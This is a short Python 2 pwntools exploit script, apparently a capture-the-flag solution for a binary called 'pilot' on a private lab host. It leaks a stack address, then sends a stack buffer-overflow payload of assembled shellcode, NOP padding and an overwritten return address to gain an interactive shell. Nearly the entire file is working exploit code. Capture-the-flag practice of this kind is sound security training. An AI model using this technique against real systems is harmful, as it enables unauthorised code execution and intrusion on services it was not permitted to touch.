#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('pilot')

host = args.HOST or '10.67.0.1'
port = int(args.PORT or 31066)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

context.terminal = ['gnome-terminal', '-e']
gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

import os
os.system('nasm shellcode64.asm -o shellcode64.o')
with open("shellcode64.o", "rb") as f:
    shell = f.read()

log.info(shell)

io.readuntil("[*]Location:0x")
RIP = int(io.readuntil("\n"), 16)

log.info(hex(RIP))
log.info(cyclic_find("kaaalaaa"))

payload = shell + (cyclic_find("kaaalaaa") - len(shell)) * "\x90" + p64(RIP)

log.info(len(shell))
log.info(payload)

io.send(payload)

io.interactive()

